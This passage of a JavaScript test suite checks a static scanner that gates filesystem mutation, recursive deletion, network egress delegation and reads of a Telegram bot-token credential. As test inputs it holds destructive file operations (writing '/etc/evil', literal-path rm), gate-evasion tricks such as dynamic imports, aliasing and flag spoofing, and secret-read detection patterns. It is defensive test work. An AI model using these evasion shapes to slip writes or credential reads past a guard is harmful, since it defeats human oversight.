  it('the real local-const O_RDONLY|O_NOFOLLOW flags shape resolves as read → NO finding', () => {
    deepStrictEqual(scan('context.mjs', "import { open } from 'node:fs/promises'; const flags = fsConstants.O_RDONLY | (fsConstants.O_NOFOLLOW ?? 0); const h = await open(p, flags);"), []);
  });
  it('the |=-augmented let-flags read shape (egress-config) resolves → NO finding', () => {
    deepStrictEqual(scan('egress-config.mjs', "import fs from 'node:fs'; let flags = fs.constants.O_RDONLY; flags |= fs.constants.O_NOFOLLOW; const fd = fs.openSync(p, flags);"), []);
  });
  it('a |=-augmentation smuggling a write flag onto a read base → fs-open-gate', () => {
    ok(rules(scan('egress-config.mjs', "import fs from 'node:fs'; let flags = fs.constants.O_RDONLY; flags |= fs.constants.O_CREAT; const fd = fs.openSync(p, flags);")).includes('fs-open-gate'));
  });
  it('an unresolvable flags identifier fails closed → fs-open-gate', () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, mystery);")).includes('fs-open-gate'));
  });
  it('an open( inside a string literal is NOT a call (no over-reject)', () => {
    deepStrictEqual(scan('bootstrap-artifacts.mjs', 'import { open } from \'node:fs/promises\'; const msg = `open(started ${x})`; const h = await open(p, \'r\');'), []);
  });

  // --- fs-delete-gate: recursive removals pinned to registered sites --------
  it('an unregistered recursive rm → fs-delete-gate', () => {
    ok(rules(scan('context.mjs', "import { rm } from 'node:fs/promises'; await rm(dir, { recursive: true });")).includes('fs-delete-gate'));
  });
  it('the registered doctor tempRepo recursive rm → NO finding', () => {
    deepStrictEqual(scan('doctor.mjs', "import { rm } from 'node:fs/promises'; await rm(tempRepo, { recursive: true, force: true });"), []);
  });
  it('the registered site with a DIFFERENT target identifier → fs-delete-gate', () => {
    ok(rules(scan('doctor.mjs', "import { rm } from 'node:fs/promises'; await rm(repoRoot, { recursive: true, force: true });")).includes('fs-delete-gate'));
  });
  it('the registered notify lockDir recursive rmSync → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', "import fs from 'node:fs'; fs.rmSync(lockDir, { recursive: true, force: true });"), []);
  });
  it('a recursive rmSync in notify with a different target → fs-delete-gate', () => {
    ok(rules(scan('notify.mjs', "import fs from 'node:fs'; fs.rmSync(stateDir, { recursive: true, force: true });")).includes('fs-delete-gate'));
  });
  it('a non-recursive rm needs no site registration → NO finding', () => {
    deepStrictEqual(scan('context.mjs', "import { rm } from 'node:fs/promises'; await rm(p, { force: true });"), []);
  });

  // --- validateOpenFlags direct unit coverage --------------------------------
  it('validateOpenFlags: default-args read, wx/ax accepted; w/a/r+ rejected', () => {
    strictEqual(validateOpenFlags('p', ''), null);
    strictEqual(validateOpenFlags("p, 'wx'", ''), null);
    strictEqual(validateOpenFlags("p, 'ax+'", ''), null);
    ok(typeof validateOpenFlags("p, 'w'", '') === 'string');
    ok(typeof validateOpenFlags("p, 'a'", '') === 'string');
    ok(typeof validateOpenFlags("p, 'r+'", '') === 'string');
  });

  // --- plan-verify hardening: the peer's reproduced bypasses now fail closed -
  it('a dynamic fs import → fs-mutation-gate (even in a registered file)', () => {
    ok(rules(scan('context.mjs', "const { writeFile } = await import('node:fs/promises'); await writeFile(p, d);")).includes('fs-mutation-gate'));
    ok(rules(scan('footer.mjs', "const fsp = await import('node:fs/promises');")).includes('fs-mutation-gate'));
  });
  it('a re-export from an fs module → fs-mutation-gate', () => {
    ok(rules(scan('footer.mjs', "export { writeFile } from 'node:fs/promises';")).includes('fs-mutation-gate'));
  });
  it("computed member access on an fs binding (fs['writeFileSync']) → fs-mutation-gate", () => {
    ok(rules(scan('notify.mjs', "import fs from 'node:fs'; fs['writeFileSync'](p, d);")).includes('fs-mutation-gate'));
  });
  it('the fs.promises sub-namespace hop → fs-mutation-gate', () => {
    ok(rules(scan('notify.mjs', "import fs from 'node:fs'; await fs.promises.writeFile(p, d);")).includes('fs-mutation-gate'));
  });
  it('an fd-anchored mutation (fs.writeSync) in an unregistered file → fs-mutation-gate', () => {
    ok(rules(scan('footer.mjs', "import fs from 'node:fs'; fs.writeSync(fd, d);")).includes('fs-mutation-gate'));
  });
  it('an open/remove binding used as a VALUE (alias defeats the site gates) → fs-mutation-gate', () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const o = open; const h = await o(p, 'w');")).includes('fs-mutation-gate'));
    ok(rules(scan('context.mjs', "import { rm } from 'node:fs/promises'; const del = rm; await del(d, { recursive: true });")).includes('fs-mutation-gate'));
  });
  it('a mutating call on a LITERAL absolute path → fs-mutation-gate', () => {
    ok(rules(scan('context.mjs', "import { rm } from 'node:fs/promises'; await rm('/tmp/not-owned', { force: true });")).includes('fs-mutation-gate'));
    ok(rules(scan('compat.mjs', "import { writeFile } from 'node:fs/promises'; await writeFile('/etc/evil', d);")).includes('fs-mutation-gate'));
  });
  it('O_EXCL WITHOUT O_CREAT (overwrite of an existing file) → fs-open-gate', () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, fsConstants.O_WRONLY | fsConstants.O_EXCL);")).includes('fs-open-gate'));
  });
  it('a later reassignment smuggling a write flag onto a read declaration → fs-open-gate', () => {
    ok(rules(scan('egress-config.mjs', "import fs from 'node:fs'; let flags = fs.constants.O_RDONLY; flags = fs.constants.O_WRONLY | fs.constants.O_CREAT; const fd = fs.openSync(p, flags);")).includes('fs-open-gate'));
  });
  it('arithmetic flag spoofing (0 * O_EXCL) fails closed → fs-open-gate', () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, fsConstants.O_WRONLY | fsConstants.O_CREAT | (0 * fsConstants.O_EXCL));")).includes('fs-open-gate'));
  });
  it('removal options in a VARIABLE (can hide recursive:true) → fs-delete-gate', () => {
    ok(rules(scan('context.mjs', "import { rm } from 'node:fs/promises'; const opts = { recursive: true }; await rm(d, opts);")).includes('fs-delete-gate'));
  });
  it('removal options with a spread → fs-delete-gate', () => {
    ok(rules(scan('context.mjs', "import { rm } from 'node:fs/promises'; await rm(d, { force: true, ...extra });")).includes('fs-delete-gate'));
  });
  it('the real inline shapes stay accepted (no over-reject)', () => {
    deepStrictEqual(scan('context.mjs', "import { rm } from 'node:fs/promises'; await rm(p, { force: true });"), []);
    deepStrictEqual(scan('migrate-workflow-storage.mjs', "import { rm } from 'node:fs/promises'; await rm(dest, { recursive: false });"), []);
    deepStrictEqual(scan('notify-schema.mjs', "import fs from 'node:fs'; const fd = fs.openSync(p, 'wx'); fs.writeSync(fd, payload); fs.closeSync ? null : null;"), []);
  });
});

// ---------------------------------------------------------------------------
// (c) Registry drift — registry never looser than the code
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — registry drift', () => {
  it('every CAPABILITY_IMPORTERS file exists and imports its declared module', async () => {
    // Registry keys are basenames matched against the scanner's basename
    // fileName (scanFile keys CAPABILITY_IMPORTERS[fileName]); resolve them via
    // the whole-tree basename map like the sibling drift checks below, so a
    // lib/ capability importer (e.g. lib/retention-planner.mjs) is found where
    // it actually lives rather than assumed top-level.
    const byName = new Map((await listRuntimeScripts()).map((s) => [s.fileName, s.path]));
    for (const [file, spec] of Object.entries(registry.CAPABILITY_IMPORTERS)) {
      const path = byName.get(file);
      ok(path, `${file} should exist in the runtime scripts tree`);
      const src = await readFile(path, 'utf-8');
      for (const mod of spec.modules) {
        ok(src.includes(`from '${mod}'`), `${file} should still import ${mod}`);
      }
    }
  });

  it('every ALLOWED_KILL_SITES / ALLOWED_DESTRUCTIVE_TEMPLATES / ALLOWED_PID_LIVENESS_SITES file exists', async () => {
    // Registry `.file` values are basenames matched against the scanner's basename
    // fileName, so resolve them across the whole runtime tree — scripts/ AND
    // scripts/lib/ (the retired-cleanup template now lives in lib/plugin-management-plan.mjs).
    const byName = new Map((await listRuntimeScripts()).map((s) => [s.fileName, s.path]));
    const files = new Set([
      ...registry.ALLOWED_KILL_SITES.map((s) => s.file),
      ...registry.ALLOWED_DESTRUCTIVE_TEMPLATES.map((s) => s.file),
      ...registry.ALLOWED_PID_LIVENESS_SITES.map((s) => s.file),
    ]);
    for (const file of files) {
      const path = byName.get(file);
      ok(path, `${file} should exist in the runtime scripts tree`);
      const src = await readFile(path, 'utf-8');
      ok(src.length > 0, `${file} should exist`);
    }
  });

  it('every PINNED_HTTPS_USERS file exists and its module is a watched capability', async () => {
    // PINNED_HTTPS_USERS is deliberately NOT import-drift-checked (it is
    // inert-registerable BEFORE the impl slice adds the import — ADR-0041 §11
    // scanner-gate-before-use), but the file must exist and its `module` must be a
    // real watched capability so the entry can never grant an unwatched reach.
    for (const [file, spec] of Object.entries(registry.PINNED_HTTPS_USERS)) {
      const src = await readFile(resolve(RUNTIME_SCRIPTS, file), 'utf-8');
      ok(src.length > 0, `${file} should exist`);
      ok(registry.WATCHED_CAPABILITY_MODULES.includes(spec.module), `${file} pinned module ${spec.module} must be watched`);
    }
  });

  it('every FS_MUTATION_USERS file exists, uses each registered primitive, and references its declared write roots', async () => {
    const byName = new Map((await listRuntimeScripts()).map((s) => [s.fileName, s.path]));
    for (const [file, spec] of Object.entries(registry.FS_MUTATION_USERS)) {
      const path = byName.get(file);
      ok(path, `${file} should exist in the runtime scripts tree`);
      const src = await readFile(path, 'utf-8');
      for (const prim of spec.primitives) {
        ok(new RegExp(`\\b${prim}\\b`).test(src),
          `${file} should still use registered fs primitive '${prim}' (registry never looser than code)`);
      }
      for (const root of spec.stateRoots) {
        // `HOME:` marks the machine-global home; `os-tmpdir` marks self-created
        // mkdtemp scratch — both are declaration tokens, not literal segments.
        if (root === 'os-tmpdir') continue;
        const segments = root.replace(/^HOME:/, '').split('/').filter(Boolean);
        const lowered = src.toLowerCase();
        ok(segments.some((seg) => lowered.includes(seg.toLowerCase())),
          `${file} should reference at least one segment of declared write root '${root}'`);
      }
    }
  });

  it('every ALLOWED_RECURSIVE_REMOVALS site file exists and still pins a real recursive call', async () => {
    const byName = new Map((await listRuntimeScripts()).map((s) => [s.fileName, s.path]));
    for (const [file, sites] of Object.entries(registry.ALLOWED_RECURSIVE_REMOVALS)) {
      const path = byName.get(file);
      ok(path, `${file} should exist in the runtime scripts tree`);
      const src = await readFile(path, 'utf-8');
      for (const site of sites) {
        ok(new RegExp(`${site.callee}\\(\\s*${site.target}\\b`).test(src),
          `${file} should still contain the pinned recursive removal ${site.callee}(${site.target}, …) (registry never looser than code)`);
      }
    }
  });
});

// ---------------------------------------------------------------------------
// (c) ADR-0048 §3 — delegated egress emitter (doctor → runEmit) pin
// ---------------------------------------------------------------------------

describe('ADR-0048 §3 guard — delegated egress emitter (runEmit) pin', () => {
  // The egress-ack-proof executor reaches the network with NO network import:
  // doctor.mjs calls notify.mjs' runEmit in-process, and notify.mjs owns the
  // pinned api.telegram.org request (PINNED_HTTPS_USERS). The import-anchored
  // gates cannot see that reach, so the delegation is pinned as data
  // (DELEGATED_EGRESS_EMITTERS) and enforced here in both directions.
  async function runEmitImporters() {
    const scripts = await listRuntimeScripts();
    const importers = new Map();
    for (const s of scripts) {
      const src = stripComments(await readFile(s.path, 'utf-8'));
      const { staticImports, dynamic } = findImports(src);
      const staticHit = staticImports.find((imp) => imp.names.some((n) => n.imported === 'runEmit'));
      // A dynamic `import('./notify.mjs')` grants access to EVERY notify export
      // including runEmit, so it counts as an importer for the fail-closed set
      // (over-approximation is the safe direction for a tripwire).
      const dynamicHit = dynamic.find((d) => d.module && /(^|\/)notify\.mjs$/.test(d.module));
      if (staticHit || dynamicHit) importers.set(s.fileName, staticHit?.module ?? dynamicHit.module);
    }
    return importers;
  }

  it('the set of runtime scripts importing runEmit equals DELEGATED_EGRESS_EMITTERS exactly', async () => {
    const importers = await runEmitImporters();
    deepStrictEqual(
      [...importers.keys()].sort(),
      Object.keys(registry.DELEGATED_EGRESS_EMITTERS).sort(),
      'a runtime script gained or lost in-process access to the E1 emitter without a DELEGATED_EGRESS_EMITTERS registry decision (fail-closed both ways: a new importer needs review; a dead entry would pre-authorize a re-added import)',
    );
  });

  it('each registered delegation matches the real import (registry never looser than code)', async () => {
    const importers = await runEmitImporters();
    for (const [file, spec] of Object.entries(registry.DELEGATED_EGRESS_EMITTERS)) {
      const module = importers.get(file);
      ok(module, `${file} is registered as a delegated egress emitter but does not import ${spec.binding}`);
      ok(/(^|\/)notify\.mjs$/.test(module), `${file} imports ${spec.binding} from '${module}', not the registered notify.mjs`);
    }
  });

  it('the pin is non-vacuous: a synthetic new importer is detected by the same matcher', () => {
    // Control case for the matcher itself (a dead regex would leave both
    // assertions above green on an empty set): the exact import shape a new
    // executor would use MUST register as a hit.
    const synthetic = stripComments(`import { runEmit } from './notify.mjs';\nawait runEmit({ eventText });\n`);
    const { staticImports } = findImports(synthetic);
    ok(staticImports.some((imp) => imp.names.some((n) => n.imported === 'runEmit')),
      'the runEmit import matcher failed to see a plain named import — the delegation pin is vacuous');
  });
});

// ---------------------------------------------------------------------------
// (c) ADR-0048 §4 — named credential-reader allowlist (static)
// ---------------------------------------------------------------------------

describe('ADR-0048 §4 guard — egress credential named-reader allowlist', () => {
  // The credential VALUE may be read out of an environment object by exactly
  // the two §4 names (activation checker + pinned emitter). Everything else
  // may at most reference the KEY (constant definition, scrub deletes,
  // fingerprint name input, placeholder rendering) — and even that set is
  // pinned, so a new file touching the key fails closed into review.
  const KEY_REFERENCE_RE = /TELEGRAM_BOT_TOKEN|EGRESS_CREDENTIAL_ENV_VAR|EGRESS_ENV_KEYS\s*\.\s*credential\b|EGRESS_ENV_KEYS\s*\[\s*['"`]credential['"`]\s*\]/;
  const VALUE_READ_RE = /(?:\benv|\bprocess\s*\.\s*env)\s*(?:\.\s*TELEGRAM_BOT_TOKEN\b|\[\s*(?:['"`]TELEGRAM_BOT_TOKEN['"`]|EGRESS_ENV_KEYS\s*\.\s*credential\b|EGRESS_CREDENTIAL_ENV_VAR\b)\s*\])/;

  // ADR-0048 §4 also binds the operator-home receiver/shim templates
  // (statusline shim + Codex notify receivers): they install outside the
  // executor surface and MUST stay credential-free. Scanned with a
  // `receivers/`-qualified name so a violating receiver can never collide
  // into a scripts/ allowlist entry — there is no receiver tier, so any hit
  // fails the exact-set assertions below.
  const RUNTIME_RECEIVERS = resolve(REPO_ROOT, registry.RUNTIME_RECEIVER_GLOB_ROOT);

  async function scanCredentialSurfaces() {
    const scripts = await listRuntimeScripts();
    const receivers = (await listRuntimeScripts(RUNTIME_RECEIVERS))
      .map((s) => ({ ...s, fileName: `receivers/${s.rel}` }));
    const scanned = [...scripts, ...receivers];
    const keyReferencers = [];
    const valueReaders = [];
    for (const s of scanned) {
      const src = stripComments(await readFile(s.path, 'utf-8'));
      if (KEY_REFERENCE_RE.test(src)) keyReferencers.push(s.fileName);
      if (VALUE_READ_RE.test(src)) valueReaders.push(s.fileName);
    }
    return { keyReferencers: keyReferencers.sort(), valueReaders: valueReaders.sort(), scannedNames: scanned.map((s) => s.fileName) };
  }

  it('the receiver/shim template home is actually inside the credential scan (non-vacuous coverage)', async () => {
    const { scannedNames } = await scanCredentialSurfaces();
    ok(scannedNames.includes('receivers/agentic-statusline.mjs'),
      'the statusline shim template is not reached by the credential scan — the §4 "shims MUST NOT read the credential" clause has no enforcement (ADR-0048 §4)');
  });

  it('credential KEY references appear in exactly the registered files', async () => {
    const { keyReferencers } = await scanCredentialSurfaces();
    deepStrictEqual(
      keyReferencers,
      Object.keys(registry.CREDENTIAL_KEY_REFERENCING_FILES).sort(),
      'a runtime script started or stopped referencing the egress credential key without a CREDENTIAL_KEY_REFERENCING_FILES registry decision (ADR-0048 §4)',
    );
  });

  it('credential VALUE reads appear in exactly the two §4 named readers', async () => {
    const { valueReaders } = await scanCredentialSurfaces();
    deepStrictEqual(
      valueReaders,
      Object.keys(registry.CREDENTIAL_VALUE_READERS).sort(),
      'a runtime script outside the §4 names (activation checker, pinned emitter) reads the egress credential value — or a named reader stopped reading it (registry never looser than code)',
    );
  });

  it('the value-reader set is a subset of the key-referencing set (tiers are nested, not parallel)', () => {
    const keys = new Set(Object.keys(registry.CREDENTIAL_KEY_REFERENCING_FILES));
    for (const reader of Object.keys(registry.CREDENTIAL_VALUE_READERS)) {
      ok(keys.has(reader), `${reader} reads the credential value but is missing from CREDENTIAL_KEY_REFERENCING_FILES`);
    }
  });

  it('the gates are non-vacuous: synthetic reads in every spelling are detected', () => {
    // Control cases (a dead regex keeps the exact-set assertions green on an
    // empty scan): each spelling a new reader would plausibly use MUST match.
    const spellings = [
      `const t = process.env.TELEGRAM_BOT_TOKEN;`,
      `const t = env['TELEGRAM_BOT_TOKEN'];`,
      `const t = env[EGRESS_ENV_KEYS.credential];`,
      `const t = ctx.env[EGRESS_CREDENTIAL_ENV_VAR];`,
      `const t = env.TELEGRAM_BOT_TOKEN ?? '';`,
    ];
    for (const code of spellings) {
      ok(VALUE_READ_RE.test(stripComments(code)), `value-read matcher missed: ${code}`);
      ok(KEY_REFERENCE_RE.test(stripComments(code)), `key-reference matcher missed: ${code}`);
    }
    // And the name-only shapes must NOT read as value reads (they are the
    // key-referencer tier — a matcher that flags them would force every
    // scrub/render site into the reader tier and dissolve the distinction).
    const nameOnly = [
      `delete out[EGRESS_CREDENTIAL_ENV_VAR];`,
      `deriveActivationFingerprint({ credentialEnvVar: EGRESS_CREDENTIAL_ENV_VAR });`,
      "`export ${EGRESS_ENV_KEYS.credential}=\"<your token>\"`",
    ];
    for (const code of nameOnly) {
      ok(!VALUE_READ_RE.test(stripComments(code)), `name-only shape wrongly matched as a value read: ${code}`);
    }
  });
});
